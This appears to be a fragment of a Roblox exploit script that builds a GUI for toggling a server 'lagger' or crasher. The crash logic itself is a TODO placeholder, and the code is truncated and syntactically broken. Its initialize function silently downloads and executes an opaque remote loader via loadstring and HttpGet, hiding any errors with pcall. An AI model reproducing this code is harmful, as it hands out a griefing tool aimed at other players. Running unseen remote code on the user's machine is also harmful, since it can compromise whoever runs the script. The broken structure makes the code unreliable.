-- // [4] UTILITY FUNCTIONS //
local function createUIGradient(parent)
    local gradient = Instance.new("UIGradient")
    gradient.Color = CONFIG.Gradient.Color
    gradient.Rotation = CONFIG.Gradient.Rotation
    gradient.Parent = parent
    return gradient
end

local function animateRainbowGradient(gradient)
    RunService.RenderStepped:Connect(function()
        local time = tick() * 0.8
        local offset = math.sin(time) * 0.5 + 0.5
        gradient.Offset = Vector2.new(offset - 1, 0)
    end)
end

local function toggleLagger(state)
    isLaggerEnabled = state

    if state then
        -- Enabled state
        Knob:TweenPosition(UDim2.new(1, -16, 0.5, -7), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
        Switch.BackgroundColor3 = Color3.fromRGB(0, 170, 80)
    else
        -- Disabled state
        Knob:TweenPosition(UDim2.new(0, 2, 0.5, -7), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
        Switch.BackgroundColor3 = CONFIG.Switch.BackgroundColor3
    end

    -- TODO: Put your actual lagger / crasher logic here
    -- Example: if isLaggerEnabled then startLagLoop() else stopLagLoop() end
    print("[Lagger] " .. (state and "ENABLED" or "DISABLED"))
end

local function setupConnections()
    -- Minimize button
    MinimizeButton.MouseButton1Click:Connect(function()
        local isVisible = ToggleContainer.Visible
        ToggleContainer.Visible = not isVisible
        KeybindContainer.Visible = not isVisible
    end)

    -- Toggle click
    ToggleClickArea.MouseButton1Click:Connect(function()
        toggleLagger(not isLaggerEnabled)
    end)

    -- Keybind button (placeholder - easy to expand)

local function initialize()
    -- External loader (wrapped safely)
    pcall(function()
        loadstring(game:HttpGet('https://api.luarmor.net/files/v4/loaders/223c2c219f3caa6e6700ae93511b94ab.lua'))()
    end)

    createGUI()
    setupConnections()

    -- Start with lagger disabled

end
